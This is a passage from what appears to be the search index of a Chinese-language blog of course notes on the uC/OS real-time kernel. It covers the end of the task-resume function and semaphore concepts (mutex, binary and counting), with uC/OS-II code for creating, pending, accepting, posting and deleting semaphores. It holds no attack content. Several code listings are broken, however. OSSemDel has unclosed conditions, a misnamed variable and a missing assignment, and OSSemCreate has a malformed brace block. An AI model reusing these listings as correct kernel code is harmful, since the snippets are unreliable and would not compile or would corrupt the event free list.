OS_SAFETY_CRITICAL_EXCEPTION(); return; } #endif // \u4e2d\u65ad\u4e2d\u4e0d\u5141\u8bb8\u8c03\u7528\u4efb\u52a1\u6302\u8d77\u51fd\u6570 #if OS_CFG_CALLED_FROM_ISR_CHK_EN > 0u if (OSIntNestingCtr > (OS_NESTING_CTR)0) { *p_err = OS_ERR_TASK_RESUME_ISR; return; } #endif // \u8fdb\u5165\u4e34\u754c\u6bb5 CPU_CRITICAL_ENTER(); // \u662f\u5426\u8fdb\u884c\u53c2\u6570\u68c0\u6d4b #if OS_CFG_ARG_CHK_EN > 0u /*\u5982\u679c\u53c2\u6570p_tcb\u662f\u7a7a\u6307\u9488\u6216\u8005\u6307\u5411\u5f53\u524d\u4efb\u52a1\u7684\u6307\u9488\uff0c\u90a3\u4e48\u4e0d\u80fd\u7ee7\u7eed\u8fdb\u884c\u6062\u590d\u64cd\u4f5c \u56e0\u4e3a\u5f53\u524d\u4efb\u52a1\u6b63\u5728\u8fd0\u884c\uff0c\u6ca1\u6709\u5904\u4e8e\u6302\u8d77\u72b6\u6001\u3002*/ if ((p_tcb == (OS_TCB *)0) || (p_tcb == OSTCBCurPtr)) { CPU_CRITICAL_EXIT(); *p_err = OS_ERR_TASK_RESUME_SELF; return; } #endif *p_err = OS_ERR_NONE; // \u6839\u636e\u4efb\u52a1\u7684\u72b6\u6001\u8fdb\u884c\u64cd\u4f5c switch (p_tcb->TaskState) { // \u5982\u679c\u4efb\u52a1\u6ca1\u6709\u5904\u4e8e\u6302\u8d77\u7684\u76f8\u5173\u72b6\u6001\uff0c\u5c31\u76f4\u63a5\u9000\u51fa case OS_TASK_STATE_RDY: case OS_TASK_STATE_DLY: case OS_TASK_STATE_PEND: case OS_TASK_STATE_PEND_TIMEOUT: CPU_CRITICAL_EXIT(); *p_err = OS_ERR_TASK_NOT_SUSPENDED; break; // \u5982\u679c\u4efb\u52a1\u53ea\u662f\u5904\u4e8e\u6302\u8d77\u72b6\u6001 case OS_TASK_STATE_SUSPENDED: // \u5f00\u4e2d\u65ad\u7136\u540e\u9501\u4f4f\u8c03\u5ea6\u5668 OS_CRITICAL_ENTER_CPU_CRITICAL_EXIT(); // \u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u51cf1 p_tcb->SuspendCtr--; // \u5982\u679c\u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u4e3a0\uff0c\u90a3\u4e48\u5c31\u5c06\u4efb\u52a1\u7f6e\u4e8e\u5c31\u7eea\u72b6\u6001 if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_RDY; OS_TaskRdy(p_tcb); } // \u51cf\u5c11\u8c03\u5ea6\u5668\u5d4c\u5957\u5c42\u6570\uff0c\u5373\u9000\u51fa\u4e34\u754c\u6bb5 OS_CRITICAL_EXIT_NO_SCHED(); break; // \u4efb\u52a1\u5904\u4e8e\u5ef6\u65f6\u548c\u6302\u8d77\u4e24\u79cd\u72b6\u6001 case OS_TASK_STATE_DLY_SUSPENDED: // \u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u51cf1 p_tcb->SuspendCtr--; // \u5982\u679c\u5d4c\u5957\u5c42\u6570\u5df2\u7ecf\u4e3a0\uff0c\u8bf4\u660e\u5df2\u7ecf\u8131\u79bb\u6302\u8d77\u72b6\u6001\uff0c\u5269\u4e0b\u7b49\u5f85\u72b6\u6001 if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_DLY; } // \u9000\u51fa\u4e34\u754c\u6bb5 CPU_CRITICAL_EXIT(); break; /*\u4efb\u52a1\u5904\u4e8e\u6302\u8d77\u548c\u7b49\u5f85\u4e24\u79cd\u72b6\u6001\uff0c\u4ecd\u7136\u662f\u5148\u5c06\u5d4c\u5957\u5c42\u6570\u51cf1\uff0c\u7136\u540e\u68c0\u67e5 \u6302\u8d77\u5d4c\u5957\u7684\u5c42\u6570\u662f\u5426\u4e3a0\uff0c\u4e3a0\u5c31\u53ea\u5269\u4e0b\u7b49\u5f85\u72b6\u6001\u4e86*/ case OS_TASK_STATE_PEND_SUSPENDED: p_tcb->SuspendCtr--; if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_PEND; } CPU_CRITICAL_EXIT(); break; /*\u4efb\u52a1\u5904\u4e8e\u6302\u8d77\u548c\u8d85\u65f6\u7b49\u5f85\u4e24\u79cd\u72b6\u6001\uff0c\u4ecd\u7136\u662f\u5148\u5c06\u5d4c\u5957\u5c42\u6570\u51cf1\uff0c\u7136\u540e\u68c0\u67e5 \u6302\u8d77\u5d4c\u5957\u7684\u5c42\u6570\u662f\u5426\u4e3a0\uff0c\u4e3a0\u5c31\u53ea\u5269\u4e0b\u8d85\u65f6\u7b49\u5f85\u72b6\u6001\u4e86*/ case OS_TASK_STATE_PEND_TIMEOUT_SUSPENDED: p_tcb->SuspendCtr--; if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_PEND_TIMEOUT; } CPU_CRITICAL_EXIT(); break; default: CPU_CRITICAL_EXIT(); *p_err = O","title":"10.4. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#11","text":"[1] \u674e\u60a6\u57ce. \u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2016. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"11. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/","text":"uCos\u4e2d\u7684\u4fe1\u53f7\u91cf\u673a\u5236 # \u76ee\u5f55 # uCos\u4e2d\u7684\u4fe1\u53f7\u91cf\u673a\u5236 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 2.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528 2.2. \u540c\u6b65\u6216\u901a\u4fe1\u7684\u57fa\u672c\u65b9\u5f0f 3. \u4fe1\u53f7\u91cf 3.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528 3.2. \u5206\u7c7b 3.3. \u4e92\u65a5\u4fe1\u53f7\u91cf 3.3.1. \u5d4c\u5957(\u9012\u5f52)\u8d44\u6e90\u8bbf\u95ee 3.3.2. \u5220\u9664\u5b89\u5168 3.4. \u5404\u79cd\u4e92\u65a5\u673a\u5236\u7684\u6bd4\u8f83 3.5. \u4e8c\u503c\u4fe1\u53f7\u91cf 3.6. \u8ba1\u6570\u4fe1\u53f7\u91cf 4. uC/OS-II\u4e2d\u5b9e\u73b0 4.1. \u521b\u5efa\u4fe1\u53f7\u91cf 4.2. \u83b7\u53d6(\u7533\u8bf7)\u4fe1\u53f7\u91cf 4.3. \u91ca\u653e\u4fe1\u53f7\u91cf 4.4. \u5220\u9664\u4fe1\u53f7\u91cf 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u4fe1\u53f7\u91cf\u673a\u5236\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002 2. \u6982\u8ff0 # 2.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528 # \\text{Figure 1. \u6a21\u578b} \u5728\u5355\u5904\u7406\u5668\u5e73\u53f0\u4e0a\uff0c\u5d4c\u5165\u5f0f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u63d0\u4f9b\u7684\u540c\u6b65\u3001\u4e92\u65a5\u4e0e\u901a\u4fe1\u673a\u5236 \u4e3b\u8981\u5305\u62ec\uff1a \u4fe1\u53f7\u91cf \uff08semaphore\uff09\uff0c\u7528\u4e8e\u4e92\u65a5\u4e0e\u540c\u6b65\u3002 \u4e8b\u4ef6\uff08\u7ec4\uff09 \uff08event group\uff09\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u90ae\u7bb1 \uff08mailbox\uff09\u3001\u6d88\u606f\u961f\u5217\uff08message queue\uff09\uff0c\u7528\u4e8e\u6d88\u606f\u901a\u4fe1\u3002 \u5f02\u6b65\u4fe1\u53f7 \uff08asynchronous signal\uff09\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u7ba1\u9053 \uff08pipe\uff09\uff0c\u63d0\u4f9b\u975e\u7ed3\u6784\u5316\u6570\u636e\u4ea4\u6362\uff08\u901a\u4fe1\uff09\u548c\u5b9e\u73b0\u540c\u6b65\u3002 \u5355\u5904\u7406\u5668\u6216\u591a\u5904\u7406\u5668\u7cfb\u7edf\u4e2d\uff0c\u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u673a\u5236\u4e5f\u53ef\u7528\u4e8e\u540c\u6b65\u4e0e\u901a\u4fe1\uff1a \u5168\u5c40\u53d8\u91cf \u5171\u4eab\u5185\u5b58 Sockets \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08Remote Procedure Call\uff09 2.2. \u540c\u6b65\u6216\u901a\u4fe1\u7684\u57fa\u672c\u65b9\u5f0f # \\text{Figure 2. \u540c\u6b65\u6216\u901a\u4fe1\u7684\u57fa\u672c\u65b9\u5f0f} 3. \u4fe1\u53f7\u91cf # 3.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528 # \u5728\u5355\u5904\u7406\u5668\u5e73\u53f0\u4e0a\uff0c\u5d4c\u5165\u5f0f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u63d0\u4f9b\u7684\u540c\u6b65\u3001\u4e92\u65a5\u4e0e\u901a\u4fe1\u673a\u5236 \u4e3b\u8981\u5305\u62ec: \u4fe1\u53f7\u91cf (semaphore)\uff0c\u7528\u4e8e\u4e92\u65a5\u4e0e\u540c\u6b65\u3002 \u4e8b\u4ef6(\u7ec4) (event group)\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u90ae\u7bb1 (mailbox)\u3001 \u6d88\u606f\u961f\u5217 (message queue)\uff0c\u7528\u4e8e\u6d88\u606f\u901a\u4fe1\u3002 \u5f02\u6b65\u4fe1\u53f7 (asynchronous signal)\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u7ba1\u9053 (pipe)\uff0c\u63d0\u4f9b\u975e\u7ed3\u6784\u5316\u6570\u636e\u4ea4\u6362(\u901a\u4fe1)\u548c\u5b9e\u73b0\u540c\u6b65\u3002 \u5355\u5904\u7406\u5668\u6216\u591a\u5904\u7406\u5668\u7cfb\u7edf\u4e2d\uff0c\u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u673a\u5236\u4e5f\u53ef\u7528\u4e8e\u540c\u6b65\u4e0e\u901a\u4fe1: \u5168\u5c40\u53d8\u91cf\u3001\u5171\u4eab\u5185\u5b58\u3001Sockets\u3001\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(Remote Procedure Call)\u3002 3.2. \u5206\u7c7b # \u4fe1\u53f7\u91cf\u7528\u4e8e\u5b9e\u73b0\u4efb\u52a1\u4e0e\u4efb\u52a1\u4e4b\u95f4\u3001\u4efb\u52a1\u4e0e\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e4b\u95f4\u7684\u540c\u6b65\u4e0e \u4e92\u65a5\u3002\u4fe1\u53f7\u91cf\u4e00\u822c\u5206\u4e3a\u4e09\u79cd: \u4e92\u65a5\u4fe1\u53f7\u91cf:\u7528\u4e8e\u89e3\u51b3\u4e92\u65a5\u95ee\u9898\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4f18\u5148\u7ea7\u53cd\u8f6c\u95ee\u9898\u3002 \u4e8c\u503c\u4fe1\u53f7\u91cf:\u7528\u4e8e\u89e3\u51b3\u540c\u6b65\u95ee\u9898 \u8ba1\u6570\u4fe1\u53f7\u91cf:\u7528\u4e8e\u89e3\u51b3\u8d44\u6e90\u8ba1\u6570\u95ee\u9898 3.3. \u4e92\u65a5\u4fe1\u53f7\u91cf # \u7528\u4e92\u65a5\u4fe1\u53f7\u91cf\u4fdd\u62a4\u7684\u4ee3\u7801\u533a\u79f0\u4f5c \u4e34\u754c\u533a \uff0c\u4e34\u754c\u533a\u4ee3\u7801\u901a\u5e38\u7528 \u4e8e\u5bf9\u5171\u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\u3002 \u5171\u4eab\u8d44\u6e90 \u53ef\u80fd\u662f\u4e00\u6bb5\u5b58\u50a8\u5668\u7a7a\u95f4\u3001\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\u6216I/O\u8bbe\u5907\uff0c\u4e5f \u53ef\u80fd\u662f\u88ab\u4e24\u4e2a\u6216\u591a\u4e2a\u5e76\u53d1\u4efb\u52a1\u5171\u4eab\u7684\u4efb\u4f55\u5185\u5bb9\u3002 \u4f7f\u7528 \u4e92\u65a5\u4fe1\u53f7\u91cf\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5171\u4eab\u8d44\u6e90\u7684\u4e32\u884c\u8bbf\u95ee \uff0c\u4fdd\u8bc1\u53ea\u6709\u6210\u529f \u5730\u83b7\u53d6\u4e92\u65a5\u4fe1\u53f7\u91cf\u7684\u4efb\u52a1\u624d\u80fd\u591f\u91ca\u653e\u5b83\u3002 \u4e92\u65a5\u4fe1\u53f7\u91cf\u57fa\u672c\u7279\u70b9:\u4e92\u65a5\u4fe1\u53f7\u91cf\u7684\u503c\u88ab\u521d\u59cb\u5316\u62101\uff0c\u6700\u591a\u53ea\u6709 \u4e00\u4e2a\u4efb\u52a1\u53ef\u4ee5\u8fdb\u5165 \u4e34\u754c\u533a \u3002 \\text{Figure 3. \u4e92\u65a5\u4fe1\u53f7\u91cf\u72b6\u6001\u56fe} \u4e92\u65a5\u4fe1\u53f7\u91cf\u662f\u4e00\u79cd \u7279\u6b8a \u7684\u4e8c\u503c\u4fe1\u53f7\u91cf\uff0c\u4e00\u822c\u5b83 \u652f\u6301\u6240\u6709\u6743\u3001\u9012\u5f52\u8bbf \u95ee\u3001\u4efb\u52a1\u5220\u9664\u5b89\u5168 \u548c\u4e00\u4e9b\u907f\u514d \u4f18\u5148\u7ea7\u53cd\u8f6c\u3001\u9965\u997f\u3001\u6b7b\u9501\u7b49 \u4e92\u65a5\u6240\u56fa \u6709\u95ee\u9898\u7684\u534f\u8bae\u3002 \u6240\u6709\u6743 :\u5f53\u4e00\u4e2a\u4efb\u52a1\u901a\u8fc7\u83b7\u53d6\u4e92\u65a5\u4fe1\u53f7\u91cf\u800c\u5c06\u5176\u9501\u5b9a\u65f6\uff0c\u5f97\u5230\u8be5\u4e92 \u65a5\u4fe1\u53f7\u91cf\u7684\u6240\u6709\u6743\u3002\u76f8\u53cd\uff0c\u5f53\u4e00\u4e2a\u4efb\u52a1\u91ca\u653e\u4fe1\u53f7\u91cf\u65f6\uff0c\u5931\u53bb\u5bf9\u5176\u7684 \u6240\u6709\u6743\u3002 3.3.1. \u5d4c\u5957(\u9012\u5f52)\u8d44\u6e90\u8bbf\u95ee # \u5d4c\u5957(\u9012\u5f52)\u8d44\u6e90\u8bbf\u95ee :\u5982\u679cTask1\u8c03\u7528RoutineA\uff0c\u800cRoutineA \u53c8\u8c03\u7528RoutineB\uff0c\u5e76\u4e14\u4e09\u8005\u8bbf\u95ee\u76f8\u540c\u7684\u5171\u4eab\u8d44\u6e90\uff0c\u5c31\u53d1\u751f\u4e86\u9012\u5f52\u5171 \u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\u540c\u6b65\u95ee\u9898\u3002 \u4e00\u4e2a\u9012\u5f52\u7684 \u4e92\u65a5\u4fe1\u53f7\u91cf\u5141\u8bb8\u5d4c\u5957\u9501\u5b9a \u4e92\u65a5\u4fe1\u53f7\u91cf\uff0c\u800c\u4e0d\u5f15\u8d77\u6b7b\u9501\u3002 \u6bcf\u4e2a\u83b7\u53d6\u4fe1\u53f7\u91cf\u7684\u8c03\u7528\u5fc5\u987b\u4e0e\u91ca\u653e\u4fe1\u53f7\u91cf\u7684 \u8c03\u7528\u76f8\u5339\u914d \u3002 \u7528\u4e8e \u540c\u6b65\u7684\u4fe1\u53f7\u91cf\u4e0d\u652f\u6301\u5d4c\u5957\u8bbf\u95ee \uff0c\u5426\u5219\u4efb\u52a1\u4f1a\u88ab\u6c38\u4e45\u963b\u585e\u3002 3.3.2. \u5220\u9664\u5b89\u5168 # \u5220\u9664\u5b89\u5168 :\u5728\u4e00\u4e2a\u53d7\u4fe1\u53f7\u91cf\u4fdd\u62a4\u7684\u4e34\u754c\u533a\uff0c\u7ecf\u5e38\u9700\u8981\u4fdd\u62a4\u5728\u4e34\u754c\u533a\u6267\u884c\u7684\u4efb\u52a1\u4e0d\u4f1a\u88ab\u610f\u5916\u5730\u5220\u9664\u3002 \u5220\u9664\u4e00\u4e2a\u5728\u4e34\u754c\u533a\u6267\u884c\u7684\u4efb\u52a1\u53ef\u80fd\u5f15\u8d77\u610f\u60f3\u4e0d\u5230\u7684\u540e\u679c\uff0c\u9020\u6210\u4fe1\u53f7\u91cf\u4e0d\u53ef\u7528\u6216\u8d44\u6e90\u7834\u574f\u3002 \u89e3\u51b3\u65b9\u6cd5 :\u63d0\u4f9b \u4efb\u52a1\u4fdd\u62a4 \u548c \u89e3\u9664\u4efb\u52a1\u4fdd\u62a4 \u539f\u8bed\u5bf9\u3002 3.4. \u5404\u79cd\u4e92\u65a5\u673a\u5236\u7684\u6bd4\u8f83 # \\text{Figure 4. \u5404\u79cd\u4e92\u65a5\u673a\u5236\u7684\u6bd4\u8f83} 3.5. \u4e8c\u503c\u4fe1\u53f7\u91cf # \u4e8c\u503c\u4fe1\u53f7\u91cf\u4e3b\u8981\u7528\u4e8e\u4efb\u52a1\u4e0e\u4efb\u52a1\u4e4b\u95f4\u3001\u4efb\u52a1\u4e0e\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e4b\u95f4\u7684 \u540c\u6b65\u3002\u4e8c\u503c\u4fe1\u53f7\u91cf\u7684\u521d\u59cb\u503c\u4e3a0\uff0c\u8868\u793a\u540c\u6b65\u4e8b\u4ef6\u5c1a\u672a\u4ea7\u751f\u3002 \\text{Figure 5. \u4e8c\u503c\u4fe1\u53f7\u91cf\u72b6\u6001\u56fe} \u7528\u4e8c\u503c\u4fe1\u53f7\u91cf\u5b9e\u73b0\u4efb\u52a1\u95f4\u53cc\u5411\u540c\u6b65\u65f6\uff0c\u7533\u8bf7\u8005\u548c\u91ca\u653e\u8005\u4e0d\u662f\u540c\u4e00\u4e2a\u4efb\u52a1\uff0c\u4e0e\u4e92\u65a5\u4fe1\u53f7\u91cf\u4e0d\u540c\u3002\u4e92\u65a5\u4fe1\u53f7\u91cf\u5fc5\u987b\u8c01\u7533\u8bf7\uff0c\u8c01\u91ca\u653e\u3002 \\text{Figure 6. \u7528\u4e8c\u503c\u4fe1\u53f7\u91cf\u5b9e\u73b0\u4efb\u52a1\u95f4\u53cc\u5411\u540c\u6b65} 3.6. \u8ba1\u6570\u4fe1\u53f7\u91cf # \u8ba1\u6570\u4fe1\u53f7\u91cf\u7528\u4e8e\u63a7\u5236\u7cfb\u7edf\u4e2d\u5171\u4eab\u8d44\u6e90\u7684\u591a\u4e2a\u5b9e\u4f8b\u7684\u4f7f\u7528\uff0c\u5141\u8bb8\u591a\u4e2a \u4efb\u52a1\u540c\u65f6\u8bbf\u95ee\u540c\u4e00\u79cd\u8d44\u6e90\u7684\u591a\u4e2a\u5b9e\u4f8b\u3002 \u8ba1\u6570\u4fe1\u53f7\u91cf\u88ab\u521d\u59cb\u5316\u4e3a\u4e00\u4e2a\u975e\u8d1f\u6574\u6570n\uff0c\u5373\u8be5\u79cd\u5171\u4eab\u8d44\u6e90\u7684\u6570\u76ee\u3002 \\text{Figure 7. \u8ba1\u6570\u4fe1\u53f7\u91cf\u72b6\u6001\u56fe} \\text{Figure 8. \u6709\u754c\u7f13\u51b2\u95ee\u98981} \\text{Figure 9. \u6709\u754c\u7f13\u51b2\u95ee\u9898} 4. uC/OS-II\u4e2d\u5b9e\u73b0 # 4.1. \u521b\u5efa\u4fe1\u53f7\u91cf # OS_EVENT* OSSemCreate(INT16U cnt) { OS_EVENT* pevent; pevent = OSEventFreeList; //\u4ece\u7a7a\u95f2\u4e8b\u4ef6\u63a7\u5236\u5757\u94fe\u4e2d\u53d6\u5f97\u4e00\u4e2aECB if (OSEventFreeList != (OS_EVENT*)0) { OSEventFreeList = (OS_EVENT*) { OSEventFreeList->OSEventPtr; } if (pevent != (OS_EVENT*)0) { //\u521d\u59cb\u5316ECB\u7684\u5404\u4e2a\u57df pevent->OSEventType = OS_EVENT_TYPE_SEM; //\u4e8b\u4ef6\u7c7b\u578b\u4e3a\u4fe1\u53f7\u91cf //\u4fe1\u53f7\u91cf\u7684\u521d\u59cb\u8ba1\u6570\u503c pevent->OSEventCnt = cnt; pevent->OSEventPtr = (void*)0; OS_EventWaitListInit(pevent); //\u521d\u59cb\u5316\u7b49\u5f85\u4efb\u52a1\u5217\u8868 } } return (pevent); //\u8c03\u7528\u8005\u9700\u68c0\u67e5\u8fd4\u56de\u503c\uff0c\u5982\u679c\u4e3aNULL\u5219\u8868\u793a\u5efa\u7acb\u5931\u8d25 } \u8bf4\u660e\uff1a\u8fd9\u662f\u9488\u5bf9\u8ba1\u6570\u4fe1\u53f7\u91cf\u548c\u4e8c\u503c\u4fe1\u53f7\u91cf\u7684\u5b9e\u73b0\u3002 \u03bcC/OS-II\u4e2d\u4e92\u65a5 \u4fe1\u53f7\u91cf\u7684\u5b9e\u73b0\u53c2\u89c1\u6e90\u7801os_mutex.c\u6587\u4ef6\u3002 \\text{Figure 10. \u57fa\u672c\u6d41\u7a0b} 4.2. \u83b7\u53d6(\u7533\u8bf7)\u4fe1\u53f7\u91cf # void OSSemPend(OS_EVENT* pevent, INT16U timeout, INT8U* err) { //\u4fe1\u53f7\u91cf\u503c\u5927\u4e8e0\uff0c\u6210\u529f\u83b7\u5f97\u4fe1\u53f7\u91cf\u5e76\u8fd4\u56de if (pevent->OSEventCnt > 0) { pevent->OSEventCnt--; *err = OS_NO_ERR; return; } //\u8bbe\u7f6e\u4efb\u52a1\u72b6\u6001\u4e3a\u7b49\u5f85\u4fe1\u53f7\u91cf OSTCBCur->OSTCBStat |= OS_STAT_SEM; //\u8bbe\u7f6e\u7b49\u5f85\u65f6\u9650 OSTCBCur->OSTCBDly = timeout; //\u5c06\u4efb\u52a1\u653e\u7f6e\u5230\u4fe1\u53f7\u91cf\u7684\u7b49\u5f85\u5217\u8868\u4e2d OS_EventTaskWait(pevent); //\u5185\u6838\u5b9e\u65bd\u4efb\u52a1\u8c03\u5ea6\uff0c\u7cfb\u7edf\u5207\u6362\u5230\u53e6\u4e00\u5c31\u7eea\u4efb\u52a1\u6267\u884c OS_Sched(); //\u5224\u65ad\u4efb\u52a1\u6062\u590d\u6267\u884c\u7684\u539f\u56e0\uff0c\u5982\u679c\u7b49\u5f85\u65f6\u9650\u8d85\u65f6\u4f46\u4ecd\u7136\u672a\u83b7\u5f97\u4fe1\u53f7\u91cf\uff0c\u5219\u8fd4\u56de\u8d85\u65f6\u4fe1\u606f if (OSTCBCur->OSTCBStat & OS_STAT_SEM) { OSEventTO(pevent); *err = OS_TIMEOUT; return; } OSTCBCur->OSTCBEventPtr = (OS_EVENT*)0; *err = OS_NO_ERR; //\u4efb\u52a1\u7531\u4e8e\u83b7\u5f97\u4fe1\u53f7\u91cf\u800c\u6062\u590d\u6267\u884c\uff0c\u672c\u8c03\u7528\u6210\u529f\u8fd4\u56de } \u8bf4\u660e\uff1a\u8fd9\u91cc\u540c\u6837\u662f\u9488\u5bf9\u8ba1\u6570\u4fe1\u53f7\u91cf\u548c\u4e8c\u503c\u4fe1\u53f7\u91cf\u7684\u5b9e\u73b0\u3002 OSSemAccept \u4e5f\u53ef\u4ee5\u5b9e\u73b0\u83b7\u53d6(\u7533\u8bf7)\u4fe1\u53f7\u91cf\u7684\u529f\u80fd\u3002 INT16U OSSemAccept(OS_EVENT* pevent) { INT16U cnt; cnt = pevent->OSEventCnt; if (cnt > 0) { pevent->OSEventCnt--; } return (cnt); } \u529f\u80fd\uff1a\u65e0\u7b49\u5f85\u7684\u83b7\u53d6\u6216\u7533\u8bf7\u4e00\u4e2a\u4fe1\u53f7\u91cf\u3002 \u6ce8\u610f\uff1a\u5373\u4f7f\u4e0d\u80fd\u6210\u529f\u83b7\u5f97\u4fe1\u53f7\u91cf(\u8fd4\u56de\u503c\u4e3a0)\uff0c\u8c03\u7528\u8005\u4e5f\u4e0d \u4f1a\u88ab\u963b\u585e\u3002\u6b64\u51fd\u6570 \u53ef\u4ee5\u5728\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e2d\u4f7f\u7528 \u3002 4.3. \u91ca\u653e\u4fe1\u53f7\u91cf # \\text{Figure 12. \u91ca\u653e\u4fe1\u53f7\u91cf} INT8U OSSemPost(OS_EVENT* pevent) { if (pevent->OSEventGrp != 0x00) { //\u5982\u679c\u6709\u4efb\u52a1\u5728\u7b49\u5f85\u8be5\u4fe1\u53f7\u91cf OS_EventTaskRdy(pevent, (void*)0, OS_STAT_SEM); //\u4f7f\u7b49\u5f85\u5217\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u5c31\u7eea OS_Sched(); //\u5185\u6838\u5b9e\u65bd\u4efb\u52a1\u8c03\u5ea6 return (OS_NO_ERR); //\u6210\u529f\u8fd4\u56de } if (pevent->OSEventCnt < 65535) { //\u5982\u679c\u6ca1\u6709\u4efb\u52a1\u7b49\u5f85\u8be5\u4fe1\u53f7\u91cf\uff0c\u5e76\u4e14\u4fe1\u53f7\u91cf\u7684\u503c\u672a\u6ea2\u51fa pevent->OSEventCnt++; //\u4fe1\u53f7\u91cf\u7684\u503c\u52a01 return (OS_NO_ERR); //\u6210\u529f\u8fd4\u56de } return (OS_SEM_OVF); //\u4fe1\u53f7\u91cf\u6ea2\u51fa } 4.4. \u5220\u9664\u4fe1\u53f7\u91cf # \\text{Figure 13. \u5220\u9664\u4fe1\u53f7\u91cf} OS_EVENT* OSSemDel(OS_EVENT* pevent, INT8U opt, INT8U* err) { BOOLEAN tasks_waiting; if(pevent->OSEventGrp!=0x00{//\u6839\u636e\u662f\u5426\u6709\u4efb\u52a1\u5728\u7b49\u5f85\u4fe1\u53f7\u91cf\u8bbe\u7f6e\u7b49\u5f85\u6807\u5fd7 tasks_waiting = TRUE; }else{ tasks_waiting = FALSE; } switch(opt){ case OS_DEL_NO_PEND: //\u5982\u679c\u6709\u4efb\u52a1\u7b49\u5f85\u4fe1\u53f7\u91cf\u5219\u4e0d\u5220\u9664\u4fe1\u53f7\u91cf if(task_waiting==FALSE{ //\u6ca1\u6709\u4efb\u52a1\u7b49\u5f85\uff0c\u91ca\u653eECB\u56de\u7a7a\u95f2\u94fe pevent->OSEventType = OS_EVENT_TYPE_UNUSED; pevent->OSEventPtr = OSEventFreeList; OSEventFreeList = pevent; //\u8c03\u6574\u7a7a\u95f2ECB\u94fe\u5934\u6307\u9488 *err = OS_NO_ERR; return ((OS_EVENT)0); }else{ *err = OS_ERR_TASK_WAITING; //\u6709\u4efb\u52a1\u7b49\u5f85\uff0c\u5220\u9664\u4fe1\u53f7\u91cf\u5931\u8d25 return (pevent); } case OS_DEL_ALWAYS: //\u65e0\u8bba\u6709\u65e0\u4efb\u52a1\u7b49\u5f85\u90fd\u5220\u9664\u4fe1\u53f7\u91cf //\u5c06\u7b49\u5f85\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u4efb\u52a1\u90fd\u8bbe\u7f6e\u6210\u5c31\u7eea while (pevent->OSEventGrp != 0x00) { OS_EventTaskRdy(pevent, (void*)0, OS_STAT_SEM); } pevent->OSEventType = OS_EVENT_TYPE_UNUSED; pevent->OSEventFreeList; OSEventFreeList = pevent; //\u91ca\u653e\u8be5\u4fe1\u53f7\u91cf\u7684ECB\u56de\u7a7a\u95f2\u63a7\u5236\u5757\u94fe if (tasks_waiting == TRUE) { OS_Sched(); } //\u5982\u679c\u4e4b\u524d\u6709\u4efb\u52a1\u7b49\u5f85\u4fe1\u53f7\u91cf\uff0c\u5185\u6838\u5b9e\u65bd\u4efb\u52a1\u8c03\u5ea6 *err 